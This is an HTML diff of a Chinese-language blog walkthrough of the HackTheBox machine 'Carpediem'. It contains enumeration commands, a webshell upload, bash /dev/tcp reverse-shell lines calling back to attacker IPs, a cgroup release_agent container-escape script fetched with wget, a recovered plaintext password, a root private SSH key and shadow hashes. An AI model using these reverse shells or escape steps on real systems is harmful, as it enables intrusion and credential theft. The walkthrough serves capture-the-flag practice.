@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;478  10.10.11.167   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.167Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-09-27 13:">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;478  10.10.11.167                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Carpediem - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2022/09/27/Carpediem-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;478  10.10.11.167   端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.167Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2022-09-27 13:">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.com&#x2F;home&#x2F;machines&#x2F;profile&#x2F;478  10.10.11.167                                                                                                              端口扫描22和80: 12345678">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092701.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092702.jpg">
 <meta property="og:image" content="https://github.com/zjicmDarkWing/images2022/raw/main/2022092703.jpg">
@@ -131,7 +131,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -221,14 +221,28 @@
 </li>
 <li><h2 id="10-10-11-167"><a href="#10-10-11-167" class="headerlink" title="10.10.11.167"></a>10.10.11.167</h2></li>
 </ul>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092701.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092701.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.167</span></span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-27 13:12 CST</span><br><span class="line">Nmap scan report for 10.10.11.167</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 962176f72dc5f04ee0a8dfb4d95e4526 (RSA)</span><br><span class="line">|   256 b16de3fada10b97b9e57535c5bb76006 (ECDSA)</span><br><span class="line">|_  256 6a1696d80529d590bf6b2a0932dc364f (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Comming Soon</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 72.62 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>comming soon,得到的域名加hosts：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.167 carpediem.htb</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092702.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092702.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="子域名扫描"><a href="#子域名扫描" class="headerlink" title="子域名扫描"></a>子域名扫描</h1><p>常规字典扫描子域名，发现porpal：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://carpediem.htb -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line"></span><br><span class="line">Found: portal.carpediem.htb (Status: 200) [Size: 31090]</span><br></pre></td></tr></table></figure>
 
@@ -236,24 +250,87 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.167 carpediem.htb portal.carpediem.htb</span><br></pre></td></tr></table></figure>
 
 <h2 id="portal-carpediem-htb"><a href="#portal-carpediem-htb" class="headerlink" title="portal.carpediem.htb"></a>portal.carpediem.htb</h2><p>在线摩托商城：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092703.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092703.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>目录扫描，在portal下发现admin：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://portal.carpediem.htb</span><br><span class="line"></span><br><span class="line">/admin                (Status: 301) [Size: 328] [--&gt; http://portal.carpediem.htb/admin/]</span><br><span class="line">/assets               (Status: 301) [Size: 329] [--&gt; http://portal.carpediem.htb/assets/]</span><br><span class="line">/build                (Status: 301) [Size: 328] [--&gt; http://portal.carpediem.htb/build/]</span><br><span class="line">/classes              (Status: 301) [Size: 330] [--&gt; http://portal.carpediem.htb/classes/]</span><br><span class="line">/dist                 (Status: 301) [Size: 327] [--&gt; http://portal.carpediem.htb/dist/]</span><br><span class="line">/inc                  (Status: 301) [Size: 326] [--&gt; http://portal.carpediem.htb/inc/]</span><br><span class="line">/index.php            (Status: 200) [Size: 31090]</span><br><span class="line">/libs                 (Status: 301) [Size: 327] [--&gt; http://portal.carpediem.htb/libs/]</span><br><span class="line">/plugins              (Status: 301) [Size: 330] [--&gt; http://portal.carpediem.htb/plugins/]</span><br><span class="line">/uploads              (Status: 301) [Size: 330] [--&gt; http://portal.carpediem.htb/uploads/]</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092705.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092705.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="portal-carpediem-htb-1"><a href="#portal-carpediem-htb-1" class="headerlink" title="portal.carpediem.htb"></a>portal.carpediem.htb</h1><p>任意注册登录,更新资料的请求中发现login_type参数：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092704.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092704.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>尝试将其修改为1，我们是管理员,可以访问admin界面：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092706.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092706.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>上传季度报告处，网页上显示上传功能还在开发，但可以得到upload接口直接调用，从而上传webshell：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092707.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092708.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092709.jpg" alt=""></p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092710.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092707.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092708.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092709.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092710.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><p>一个容器内的www-data:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.19/4444 &lt;&amp;1'</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092711.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092711.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="docker网段扫描"><a href="#docker网段扫描" class="headerlink" title="docker网段扫描"></a>docker网段扫描</h1><p>这部分考试网络问题比较差，参考wp云了</p>
 <p>探测docker网段，发现其他容器：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.17.0.1</span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">22/tcp open   ssh</span><br><span class="line">80/tcp open   http</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.17.0.2</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">21/tcp  open  ftp</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.17.0.3</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">27017/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.17.0.4</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">33060/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.17.0.5</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">8118/tcp open  unknown</span><br></pre></td></tr></table></figure>
@@ -272,7 +349,14 @@
 <h2 id="bcrypt-py"><a href="#bcrypt-py" class="headerlink" title="bcrypt.py"></a>bcrypt.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bcrypt</span><br><span class="line"></span><br><span class="line">password = <span class="string">"password"</span></span><br><span class="line">salt = bcrypt.gensalt(rounds=<span class="number">10</span>)</span><br><span class="line">encoded = bcrypt.hashpw(password.encode(),salt)</span><br><span class="line"></span><br><span class="line">print(encoded)</span><br></pre></td></tr></table></figure>
 
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>使用前面得到的hflaccus账户ssh连接,得到user flag：</p>
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092712.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092712.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="backdrop"><a href="#backdrop" class="headerlink" title="backdrop"></a>backdrop</h1><p>继续云，hflaccus用户tcpdump抓到一些https流量， 使用对应私钥解密，得到jpardella账号密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i any port 443 -w captura</span><br><span class="line"></span><br><span class="line">file /etc/ssl/certs/backdrop.carpediem.htb.key</span><br><span class="line">/etc/ssl/certs/backdrop.carpediem.htb.key: PEM RSA private key</span><br><span class="line"></span><br><span class="line">jpardella</span><br><span class="line">tGPN6AmJDZwYWdhY</span><br></pre></td></tr></table></figure>
 
@@ -296,7 +380,14 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">❯ cat script.sh</span><br><span class="line">mkdir /dev/shm/privesc</span><br><span class="line">mount -t cgroup -o rdma cgroup /dev/shm/privesc</span><br><span class="line">mkdir /dev/shm/privesc/x</span><br><span class="line">echo 1 &gt; /dev/shm/privesc/x/notify_on_release</span><br><span class="line">host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`</span><br><span class="line">echo "$host_path/cmd" &gt; /dev/shm/privesc/release_agent</span><br><span class="line">echo '#!/bin/bash' &gt; /cmd</span><br><span class="line">echo "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.10/443 0&gt;&amp;1'" &gt;&gt; /cmd</span><br><span class="line">chmod a+x /cmd</span><br><span class="line">bash -c "echo \$\$ &gt; /dev/shm/privesc/x/cgroup.procs"</span><br><span class="line"></span><br><span class="line">root@90c7f522b842:~# unshare -UrmC bash</span><br><span class="line">root@90c7f522b842:~# wget http://10.10.14.10/script.sh &amp;&gt;/dev/null</span><br><span class="line">root@90c7f522b842:~# chmod +x script.sh</span><br><span class="line">root@90c7f522b842:~# ./script.sh</span><br><span class="line">root@90c7f522b842:~#</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092713.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://github.com/zjicmDarkWing/images2022/raw/main/2022092713.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="root-id-rsa"><a href="#root-id-rsa" class="headerlink" title="root_id_rsa"></a>root_id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAn4XMDVkBUi5Cch7+bhxOLQzqofUIElWw6wNQ2MNZIi3QTUYE0cSn</span><br><span class="line">rCrrVSGKt1BRWrXlNjanoGJGvfENm02L+Dm9dUPbFaJjcFBG80DjrWsVfkCYSwe3g9KjCk</span><br><span class="line">kqXrHXtapCgERNCga82snoEgYN3z9vmsrw&#x2F;nd2D6OVsQxkIck7bzC2+p2EinjhaY9BVtO0</span><br><span class="line">UVkcDrMBvRq64JOkHHktYEBF95SDRHav1JW6M&#x2F;wY6lan18Zfrc2x0c+Ktavpp6KwHVXOcJ</span><br><span class="line">veuChxMfbWOgyaubMV57iZ828vloyoUZRy4OlZr0Jxe5FQGcxWT2&#x2F;nhWKU3uo4Vi&#x2F;mSWha</span><br><span class="line">hNMY8s+ip7y9lJZZ4&#x2F;ZnN0nkkriO5xWwJu4+FEwDM9a2ZVbpfRAqcCNVQR5atHaGLl3pM6</span><br><span class="line">LDpyN9i95ks03BOo&#x2F;9U6SULuWK&#x2F;IfQjzlCLP28EJBb6W5cMBvB+yZSAGJ15fKYv2+9c4dj</span><br><span class="line">JLefRpTq65BzjwUIxseflmyTL08WYGzSB9amCsHzAAAFiCMHoVMjB6FTAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJ+FzA1ZAVIuQnIe&#x2F;m4cTi0M6qH1CBJVsOsDUNjDWSIt0E1GBNHEp6wq61UhirdQ</span><br><span class="line">UVq15TY2p6BiRr3xDZtNi&#x2F;g5vXVD2xWiY3BQRvNA461rFX5AmEsHt4PSowpJKl6x17WqQo</span><br><span class="line">BETQoGvNrJ6BIGDd8&#x2F;b5rK8P53dg+jlbEMZCHJO28wtvqdhIp44WmPQVbTtFFZHA6zAb0a</span><br><span class="line">uuCTpBx5LWBARfeUg0R2r9SVujP8GOpWp9fGX63NsdHPirWr6aeisB1VznCb3rgocTH21j</span><br><span class="line">oMmrmzFee4mfNvL5aMqFGUcuDpWa9CcXuRUBnMVk9v54VilN7qOFYv5kloWoTTGPLPoqe8</span><br><span class="line">vZSWWeP2ZzdJ5JK4jucVsCbuPhRMAzPWtmVW6X0QKnAjVUEeWrR2hi5d6TOiw6cjfYveZL</span><br><span class="line">NNwTqP&#x2F;VOklC7livyH0I85Qiz9vBCQW+luXDAbwfsmUgBideXymL9vvXOHYyS3n0aU6uuQ</span><br><span class="line">c48FCMbHn5Zsky9PFmBs0gfWpgrB8wAAAAMBAAEAAAGAMg6VIlccoAIeHZt2MW02ZtKXye</span><br><span class="line">yO9Nno40YuF2btUFlZ9PWUy5JPHyp0oEkfMzjD3pgXbfSmkyBjnHTI1UP3ORQ9TE&#x2F;Xrqk&#x2F;</span><br><span class="line">VN4L9YcWKrPgkbaJU3n&#x2F;byEowjCFWCOsUbg0l&#x2F;VWy1+j4W&#x2F;cH9PAhJ5uUf9+sgsgg&#x2F;XMIj</span><br><span class="line">uGLEfuG40IzgmhrqYR7cLjOPDDs4cn08D+Oa3qmFAb&#x2F;kdUItDoY7E5o8EumaHGRUvFMbux</span><br><span class="line">fXclTO+v7euXVjy03EKjTCL9poucY51N9XXPzqWnMq+2e2ajQwbURSsWJ8TpvHy&#x2F;0eDfUJ</span><br><span class="line">kyOMSNAtouZczSsipukJehuoMgn169HoIHNov1mx6n5clSBhmkAAcyXqqIoW&#x2F;Qh&#x2F;7HYWa+</span><br><span class="line">k0t&#x2F;CKrG166DJ+DGPZbWQhWAepEKkD2QXDFJB2nY0j46InBRaKSyyqId5CKRmjQy8WuqtM</span><br><span class="line">NuCn623pVXUWrsEvWeVp881h1f2t8ZBHl09mFBNTBCfnwu5Y68HQhn3biU8Zmajk5xAAAA</span><br><span class="line">wByZ9i3MAdkAeBO59jhWcB7G14KXvlo2jyr0ZStsMH&#x2F;on63EZJo6t2uLnzq7WFkY3fqf6v</span><br><span class="line">Tdp1ba9WA9RINMp5yd5BnITcees+VnoWQGJ3DjYXdUSES5dBejxOHoNCzF8QG7MAVnMCe+</span><br><span class="line">yyrGyMW1sKnWWQJW9Ni6HEPDKnvj&#x2F;hYZBI6OKST&#x2F;Pebcz8lRfMgbOsb9GheaDL6zEx9KX&#x2F;</span><br><span class="line">7y0HYBjm8VK9nzBjKRfnVpfBjBrQeD43YiRt+HB1a8C4ZGTQAAAMEAz1X60hD50s4&#x2F;CBlh</span><br><span class="line">A8Hw62Zpqqpb7eMmqRr2nLc4u&#x2F;8T3aPwS9YxgoYh9S&#x2F;R2WCZdujT0xVacNNJ86S&#x2F;QiNefq</span><br><span class="line">lrA5JoTS8cFB0ysqCzJeoOn109tyowui4Vv4iptx+id+u0l&#x2F;FazLwXTVZJJeks3WSI3OmS</span><br><span class="line">PnWQwB1vF3hrEe8LP55GEl4Jh+FiyP6WNup9satmGzcGCyKd0txwenq4PsYJ+uSNrPH&#x2F;Hi</span><br><span class="line">s89hVBwEeVkkTDP0rBc4IEQ1V&#x2F;1Gt5AAAAwQDE9udhbjBnmmKHOv3G7FG9+xjGLCwZqZIy</span><br><span class="line">AU57jRp1TOjVm0DSnGyUhqb79tkWCjd4OVnrFQpE&#x2F;yKiynvVNPoynwc9mIoM+QO3UF7ZXl</span><br><span class="line">+PKqszyJiYywpHZAmZXm8f5&#x2F;Kol+R&#x2F;2SI7sPlq4ripwiOv8F5CwoP&#x2F;kf2Dgl9ryCCvo+lL</span><br><span class="line">siB8rSQLuY6TXBfs+IZfggGO8Xn1JZWaF7J68DjWXo8GNdwwjdpjnoFxmBU3cEZYFjbjYB</span><br><span class="line">okkXD85q0KkcsAAAAOcm9vdEBjYXJwZWRpZW0BAgMEBQ&#x3D;&#x3D;</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
 
 <h2 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$y5QrvfE3csMMok1t$DvYGED3VsftC3ylIHA8yGVg2j2KiP7uooPn309LahXXPEZulnVWBwwKLorPdiW5snCgWEYN6F24b8LQALG1CD1:19081:0:99999:7:::</span><br><span class="line">hflaccus:$6$Y3pKa50HWcGkr&#x2F;KE$ZBG57pq5RIwDs9l75xJMz5Cv2SweVTFOcsv3WzRLC9c&#x2F;QRX7wSgNT&#x2F;XekUYExD30WTZiCHYhLg25mSTRgoZlT.:19083:0:99999:7:::</span><br></pre></td></tr></table></figure>
